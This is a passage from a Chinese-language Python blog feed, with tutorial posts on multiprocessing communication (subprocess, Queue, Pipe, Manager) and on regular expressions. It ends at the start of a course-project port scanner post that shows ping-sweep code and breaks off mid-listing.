src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529156984.47.png" alt=""></p></li></ul><h2 id="进程间的通信"><a href="#进程间的通信" class="headerlink" title="进程间的通信"></a>进程间的通信</h2><ol><li><p>使用python标准库中的subprocess包来fork一个子进程，并运行一个外部的程序</p><ul><li><p>subprocess.call(command,shell=True) fork一个子进程，并运行一个外部程序(命令)在本进程中显示结果</p></li><li><p>subprocess.check_output(command)   将外部命令执行结果放入变量，不在控制台输出</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529158361.89.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529158413.44.png" alt=""></p></li><li><p>可以看出subprocess.call和check_output的返回结果，call执行成功返回一个0，否则返回非零数，check_output返回命令执行的结果</p></li></ul></li><li><p>multiprocessing提供的Queue（Queue用来在多个进程间的通信，Queue有两个方法，get和put）</p><ul><li><p>put方法用来插入数据到队列中。有两个可选参数，blocked和timeout</p><ul><li>blocked = True（默认值），timeout 为正</li></ul><blockquote><p>该方法会阻塞 timeout 指定的时间，直到该队列有剩余空间。如果超时，抛出 Queue.Full 异常</p></blockquote><ul><li>blocked = False </li></ul><blockquote><p>如果 Queue 已满，<code>立刻</code>抛出 Queue.Full 异常</p></blockquote></li><li><p>get方法用来从队列中读取并删除一个元素。有两个参数可选，blocked 和 timeout</p><ul><li>blocked = False （默认），timeout 正值</li></ul><blockquote><p>等待时间内，没有取到任何元素，会抛出 Queue.Empty 异常</p></blockquote><ul><li>blocked = True</li></ul><blockquote><p>Queue 有一个值可用，立刻返回改值；Queue 没有任何元素</p></blockquote></li><li><p>Queue实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Queue</span><br><span class="line"><span class="keyword">import</span> os, time, random</span><br><span class="line"> </span><br><span class="line"><span class="comment">#写数据进程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proc_write</span><span class="params">(q,urls)</span>:</span></span><br><span class="line">    print(<span class="string">'Process &#123;0&#125; is writing...'</span>.format(os.getpid()))</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        q.put(url)</span><br><span class="line">        print(<span class="string">'Put %s to queue..'</span> % url)</span><br><span class="line">        time.sleep(random.random())</span><br><span class="line"> </span><br><span class="line"><span class="comment">#读数据进程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proc_read</span><span class="params">(q)</span>:</span></span><br><span class="line">    print(<span class="string">'Process &#123;0&#125; is reading...'</span>.format(os.getpid()))</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        url = q.get(<span class="keyword">True</span>)</span><br><span class="line">        print(<span class="string">'Get %s from queue...'</span> % url)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    proc_write1 = Process(target=proc_write,args=(q,[<span class="string">'url_1'</span>,<span class="string">'url_2'</span>,<span class="string">'url_3'</span>,<span class="string">'url_4'</span>]))</span><br><span class="line">    proc_write2 = Process(target=proc_write,args=(q,[<span class="string">'url_4'</span>,<span class="string">'url_5'</span>,<span class="string">'url_6'</span>]))</span><br><span class="line">    proc_reader = Process(target=proc_read,args=(q,))</span><br><span class="line">    <span class="comment">#启动子进程写入</span></span><br><span class="line">    proc_write1.start()</span><br><span class="line">    proc_write2.start()</span><br><span class="line">    <span class="comment">#启动子进程读取</span></span><br><span class="line">    proc_reader.start()</span><br><span class="line">    <span class="comment">#等待写入进程结束</span></span><br><span class="line">    proc_write1.join()</span><br><span class="line">    proc_write2.join()</span><br><span class="line">    <span class="comment">#proc_reader进程是死循环，无法等待结束，只能强行终止</span></span><br><span class="line">    proc_reader.terminate()</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529159995.04.png" alt=""></p></li></ul></li><li><p>multiprocessing提供的Pipe(常用来在两个进行间的通信，两个进程分别位于<strong>管道的两端</strong>)</p><ul><li><p>multiprocessing.Pipe([duplex])</p></li><li><p>pipe实例一（发送列表）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Pipe</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(pipe)</span>:</span></span><br><span class="line">    pipe.send([<span class="string">'spm'</span>]+[<span class="number">545</span>,<span class="string">'wdd'</span>])  <span class="comment">#send传输一个列表</span></span><br><span class="line">    pipe.close()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#实例化两个pipe对象，因为pipe进程通信实在管道的两边</span></span><br><span class="line">    (c1,c2) = Pipe()</span><br><span class="line">    sender = Process(target=send,args=(c1,))</span><br><span class="line">    sender.start()</span><br><span class="line">    print(<span class="string">"c2 got: &#123;0&#125; "</span>.format(c2.recv()))</span><br><span class="line">    c2.close()</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529160762.62.png" alt=""></p></li><li><p>pipe实例二（发送字典文件）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Pipe</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">talk</span><span class="params">(pipe)</span>:</span></span><br><span class="line">    pipe.send(dict(name=<span class="string">'ss'</span>,age=<span class="number">22</span>))</span><br><span class="line">    reply = pipe.recv()</span><br><span class="line">    print(<span class="string">'talk got:'</span>,reply)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    (a1, a2) = Pipe()</span><br><span class="line">    c = Process(target=talk, args=(a2,))  <span class="comment">#创建一个进程</span></span><br><span class="line">    c.start()</span><br><span class="line">    print(<span class="string">'parent got:'</span>,a1.recv())</span><br><span class="line">    a1.send(&#123;x * <span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'spam'</span>&#125;)</span><br><span class="line">    c.join()                 <span class="comment">#传输的数据被 talk 函数内的 pip 管道接收，并赋值给 reply</span></span><br><span class="line">    print(<span class="string">'parent exit'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529161528.8.png" alt=""></p></li></ul></li><li><p>上述的queue和pipe都是进程间的通信，实在一个进行池中，如果不在一个进程池中，用multiprocessing.Manager().Queue() 通信；同时：子进程与父进程的通信试用subprocess比较好</p><ul><li><p>不同进程池之间的通信实例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Pool,Queue,Manager</span><br><span class="line"><span class="keyword">import</span> os,time,random</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(q,list,i)</span>:</span></span><br><span class="line"> </span><br><span class="line">    print(<span class="string">"[+] This is Process_"</span>+str(i)+<span class="string">" and pid is %s START"</span>%os.getpid())</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> list:</span><br><span class="line">        q.put(item)</span><br><span class="line">        print(<span class="string">"[+] Pid %s Put : %s"</span>%(os.getpid(),item))</span><br><span class="line">    print(<span class="string">"[+] This is Process_"</span>+i+<span class="string">" and pid is %s CLOSE"</span>%os.getpid())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">     print(os.getpid())</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(q)</span>:</span></span><br><span class="line">     print(<span class="string">'[====] Process to Read , pid = %s'</span>%os.getpid())</span><br><span class="line">     <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">         data = q.get(<span class="keyword">True</span>)</span><br><span class="line">         print(<span class="string">"[=] data from Queue : %s"</span>%str(data))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">     manager = Manager()</span><br><span class="line">     q = manager.Queue()</span><br><span class="line">     p = Pool(<span class="number">5</span>)</span><br><span class="line">     listx = []</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">110</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">200</span>,<span class="number">210</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">300</span>,<span class="number">310</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">400</span>,<span class="number">410</span>)])</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">         <span class="keyword">if</span> i==<span class="number">4</span>:</span><br><span class="line">             <span class="keyword">pass</span></span><br><span class="line">             p.apply_async(read,args=(q,))</span><br><span class="line">         <span class="keyword">else</span>:</span><br><span class="line">             list = listx[i]</span><br><span class="line">             <span class="comment">#print(list)</span></span><br><span class="line">             p.apply_async(write,args=(q,list,i))</span><br><span class="line">     p.close()</span><br><span class="line">     p.join()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">     main()</span><br></pre></td></tr></table></figure><p> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529162485.23.png" alt=""></p></li></ul></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>通过一些实例学习python3的多进程，包含了主要的两个类及其适用方法；同一进程池中进程间通信，不同进程池中进程间的通信以及父类与子类的进程间通信</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python多进程&quot;&gt;&lt;a href=&quot;#python多进程&quot; class=&quot;headerlink&quot; title=&quot;python多进程&quot;&gt;&lt;/a&gt;python多进程&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;python跨平台实现多进程需要使用multiproces
      
    
    </summary>
    
      <category term="python" scheme="https://www.lsowl.xyz/categories/python/"/>
    
    
      <category term="编程" scheme="https://www.lsowl.xyz/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="python" scheme="https://www.lsowl.xyz/tags/python/"/>
    
      <category term="多进程" scheme="https://www.lsowl.xyz/tags/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>python3正则表达式学习</title>
    <link href="https://www.lsowl.xyz/2018/06/15/python3%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.lsowl.xyz/2018/06/15/python3正则表达式学习/</id>
    <published>2018-06-15T08:22:50.000Z</published>
    <updated>2018-06-15T08:33:20.282Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>python3正则表达式学习</p><blockquote><p>正则表达式是一个特殊的字符序列，它能帮助你方便检查一个字符串是否与某种模式匹配。python提供re模块使python语言拥有全部正则表达式功能。</p><p>compile函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。</p></blockquote></li><li><p>正则表达式基础</p><ul><li><p>子模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\w: 匹配任意字母、数字、或者_</span><br><span class="line">\d: 匹配数字（十进制）</span><br><span class="line">\s: 匹配空白符号（空格、tab等）</span><br><span class="line">. : 匹配任意字符（换行符除外）</span><br></pre></td></tr></table></figure></li><li><p>重复子模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\d* : 表示任意数字，包括0个，*匹配0次或者多次</span><br><span class="line">\w+ : 表示匹配至少一个字母、数字、或者_</span><br><span class="line">\w&#123;3:6&#125; :表示匹配3-6之间的字母、数字、或者_</span><br></pre></td></tr></table></figure></li><li><p>“或”运算  - |</p><p><code>(p|P)ython :可以匹配Python也可以匹配python</code> </p></li><li><p>选择符：？</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(https://)?(www.)?(lsowl.xyz) :可以匹配到：https://www.lsowl.xyz  https://lsowl.xyz www.lsowl.xyz  lsowl.xyz 四个，也就是字符串必须在最后一个元组才可以被匹配到</span><br></pre></td></tr></table></figure><p>字符集：[]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[a-zA-Z0-9_] : 等价于\w</span><br><span class="line">[0-9a-zA-Z\.\_] : 匹配数字、字母、.和_</span><br></pre></td></tr></table></figure></li><li><p>开始符和结尾符：^ , $</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^\d : 以数字开始</span><br><span class="line">\w$ : 以字母结尾</span><br><span class="line">^[a-zA-Z][0-9a-zA-Z\_]* :匹配python的合法变量</span><br></pre></td></tr></table></figure></li><li><p>分组: ()</p><ul><li><p>捕获组</p><p><code>(^[0-9a-zA-Z]\w{5,17})@[0-9a-zA-Z]+\.\w+ : 匹配邮箱用户名</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529035700.3.png" alt=""></p></li><li><p>非捕获组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(^[0-9a-zA-Z]\w&#123;5,17&#125;)@[0-9a-zA-Z]+\.(?:net|com|top|cn) ：捕获指定后缀名的邮箱用户名</span><br><span class="line"></span><br><span class="line">(?:\d+\.)&#123;3&#125;\d+ : 匹配IP</span><br></pre></td></tr></table></figure></li></ul></li><li><p>正则表达式使用的特殊符号和字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">literal 匹配字符串的值</span><br><span class="line">re1|re2 匹配正则表达式re1或re2</span><br><span class="line">. 匹配任意字符（换行符除外）</span><br><span class="line">^ 匹配字符串的开始</span><br><span class="line">$ 匹配字符串的结尾</span><br><span class="line">* 匹配前面出现的正则表达式零次或多次</span><br><span class="line">+ 匹配前面出现的正则表达式一次或多次</span><br><span class="line">？匹配前面出现的正则表达式零次或一次</span><br><span class="line">&#123;N&#125; 匹配前面出现的正则表达式N次</span><br><span class="line">&#123;M,N&#125; 匹配重复出现M次到N次的正则表达式</span><br><span class="line">[…] 匹配字符组里出现的任意一个字符</span><br><span class="line">[…x-y…] 匹配从字符x到y中的任意一个字符</span><br><span class="line">[^…] 不匹配此字符集中出现的任意一个字符</span><br><span class="line">(*|+|?|&#123;&#125;)? 用于上面出现的任何“非贪婪”。版本重复匹配次数符号。如.*?a表示匹配到第一个a出现取前面任意长度的字符。</span><br><span class="line">(…) 匹配封闭括号中正则表达式（RE），并保存为子组</span><br><span class="line">\d 匹配任何数字，和[0-9]一样（\D是\d的反义：任何非数字）</span><br><span class="line">\w 匹配任何数字字母字符，和[A-Za-z0-9_]相同(\W是\w的反义)</span><br><span class="line">\s 匹配任何空白符，和[\n\t\r\v\f]相同（\S是\s的反义）</span><br><span class="line">\b 匹配单词边界(\B是\b的反义)</span><br><span class="line">\nn 匹配已保存的子组（参考(…)）如price:\16</span><br><span class="line">\c 逐一匹配特殊字符c（即，取消它的特殊含义，按字面匹配）</span><br><span class="line">\A（\Z）匹配字符串的起始（结束）</span><br></pre></td></tr></table></figure></li><li><p>一些说明</p><p>（1）用管道符号(|)匹配多个正则表达式<br>（2）匹配除换行符外任意一个单个的字符（.）<br>（3）从字符串的开头或结尾或单词边界开始匹配（^ $或\A \Z \b \B）<br>（4）创建字符类（[]）<br>（5）指定范围（-）和否定（^）<br>（6）使用闭包操作符（* + ？ {}）实现多次出现/重复匹配<br>（7）？的两种含义：</p><ul><li><p>表示匹配出现0或1次；</p></li><li><p>紧跟在表示重复的元字符后面时（如+?），表示要求搜索引擎匹配的字符串越短越好。(*+?{m,n})尽量“吸收”更多的字符，这叫“贪心”。</p></li></ul><p>（7）特殊字符表示、字符集</p><ul><li>\d表示十进制数字（\D表示非十进制数字）</li><li>\w表示整个字符数字的字符集（\W）</li><li>\s表示空白字符（\S）</li></ul><p>（8）用圆括号（()）组建组 、()的功能：对正则表达式进行分组；匹配子组。 </p><ul><li>对正则表达式进行分组可以实现用不同的正则表达式去匹配字符串，或重复整个正则表达式多次。 </li><li>使用子组匹配是为了能够提取匹配模式的内容，Python的re支持此功能。</li></ul></li></ul></li><li><p>python的re模块<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529038902.67.png" alt=""></p><ul><li><p>re模块的用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">str = <span class="string">"xxxflag&#123;sss&#125;sss"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #用法1：</span></span><br><span class="line">re_flag = re.compile(<span class="string">r'flag&#123;\w+?&#125;'</span>)</span><br><span class="line">flag = re_flag.findall(str)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#用法2：</span></span><br><span class="line">flag =re.findall(<span class="string">r'flag&#123;\w+?&#125;'</span>,str)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></li><li><p>贪心匹配和非贪心匹配</p><ul><li>贪心匹配：正则表达尽可能多的匹配元素</li><li>非贪心匹配：正则表达式尽可能少的匹配元素<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529040261.44.png" alt=""></li></ul></li><li><p>match和search的区别</p><ul><li>match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，返回None</li><li>search匹配整个字符串，直到找到一个匹配<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529040638.88.png" alt=""></li></ul></li><li><p>分组匹配（优点在说明第（8）点）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529041162.79.png" alt=""></p></li></ul></li><li><p>python中常用的正则表达式处理函数</p><ul><li>re.match() 尝试从字符串的起始位置匹配一个模式，如果不是起始位置就匹配成功，match返回none<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047137.61.png" alt=""><ul><li>函数语法 <code>re.match(partten,string,flags=0)</code></li><li>函数参数说明<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529046903.24.png" alt=""></li><li>使用group(num)或groups()匹配对象函数来获取匹配表达式<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047000.4.png" alt=""></li></ul></li><li>re.search() 扫描整个字符串并返回第一个成功的匹配<ul><li>函数语法 <code>re.search(pattern,string,flags=0)</code></li><li>使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</li></ul></li><li>re.sub()用于替换字符串中的匹配项<ul><li>函数语法 <code>re.sub(pattern,repl,string,count=0)</code></li><li>函数参数说明<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047446.1.png" alt=""></li><li>使用实例(包含是否使用repl参数的，repl可能是个函数)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047654.68.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529048005.62.png" alt=""></li></ul></li><li>re.compile() 用于编译正则表达式，生成一个正则表达式对象供match和search两个函数使用<ul><li>函数语法 <code>re.compile(pattern[, flags])</code> </li><li>参数说明<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529048191.55.png" alt=""></li><li>使用实例（当匹配成功的时候返回一个match对象）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529048612.56.png" alt=""><img src="assets/1529049199.01.png" alt=""></li></ul></li><li>re.findall() 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回一个空列表<ul><li>函数语法 <code>findall(string[, pos[, endpos]])</code></li><li>函数参数 <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049378.54.png" alt=""></li><li>使用实例（用compile函数生成正则表达式对象）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049557.51.png" alt=""></li></ul></li><li>re.finditer() 和findall类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回<ul><li>函数语法 <code>re.finditer(pattern, string, flags=0)</code></li><li>函数参数<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049714.1.png" alt=""></li><li>使用实例(用for循环迭代输出)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049815.39.png" alt=""></li></ul></li><li>re.split() split 方法按照能够匹配的子串将字符串分割后返回列表 <ul><li>函数语法 <code>re.split(pattern, string[, maxsplit=0, flags=0])</code></li><li>函数参数 <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049924.84.png" alt=""></li><li>使用实例（对于一个找不到匹配的字符串，split不会分割）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529050075.58.png" alt=""></li></ul></li></ul></li><li><p>正则表达式对象</p><ul><li><p>re.RegexObject  (re.compile() 返回的就是一个正则表达式对象)</p></li><li><p>group()返回被RE匹配的字符串</p></li><li><p>start() 返回开始匹配的位置</p></li><li><p>end()  返回匹配结束的位置</p></li><li><p>span()返回一个元组包含（开始，结束）的位置</p></li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;&lt;p&gt;python3正则表达式学习&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;正则表达式是一个特殊的字符序列，它能帮助你方便检查一个字符串是否与某种模式匹配。python提供re模块使python语言拥有全部正则表达式功能。&lt;/p&gt;
&lt;p&gt;compile函数根据一
      
    
    </summary>
    
      <category term="python" scheme="https://www.lsowl.xyz/categories/python/"/>
    
    
      <category term="python" scheme="https://www.lsowl.xyz/tags/python/"/>
    
      <category term="正则表达式" scheme="https://www.lsowl.xyz/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>简易端口扫描器</title>
    <link href="https://www.lsowl.xyz/2018/06/14/%E7%AE%80%E6%98%93%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    <id>https://www.lsowl.xyz/2018/06/14/简易端口扫描器/</id>
    <published>2018-06-14T12:39:50.000Z</published>
    <updated>2018-06-14T13:47:54.798Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>只是一次简单的课程设计，通过Python实现端口扫描器的功能，附加ping扫描以及简单的banner获取，支持导出扫描结果。</p></blockquote><h2 id="程序运行实例"><a href="#程序运行实例" class="headerlink" title="程序运行实例"></a>程序运行实例</h2><ul><li>打印装逼信息：<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-16/38144694.jpg" alt=""></li><li>扫描实例：<img src="C:\Users\ADMINI~1\AppData\Local\Temp\1521168691496.png" alt="52116869149"></li><li>具体用法程序中有说明</li></ul><h2 id="程序说明"><a href="#程序说明" class="headerlink" title="程序说明"></a>程序说明</h2><blockquote><p>程序中默认扫描一些常见的端口、支持用户设置端口、支持多端口扫描、支持多IP扫描、支持网段存活主机发现、支持导出。</p></blockquote><ol><li><p>通过发送ping包，根据返回包的TTL值判断主机是否存活，关键代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = [<span class="string">"ping"</span>, <span class="string">"-&#123;op&#125;"</span>.format(op=self.get_os()),</span><br><span class="line">          <span class="string">"1"</span>, self.ip_pre]</span><br><span class="line">            output = os.popen(<span class="string">" "</span>.join(cmd)).readlines()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> lock.acquire():</span><br><span class="line">            flag = <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> list(output):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> str(line).upper().find(<span class="string">"TTL"</span>) &gt;=<span class="number">0</span>:</span><br><span class="line">                    flag = <span class="keyword">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+] IP: %s is OK "</span> % self.ip_pre</span><br><span class="line">                ip_str.append(self.ip_pre)</span><br><span class="line">            lock.release()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure></li><li><p>通过socket建立tcp全连接来判断端口开放信息以及banner信息的抓取，关键代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 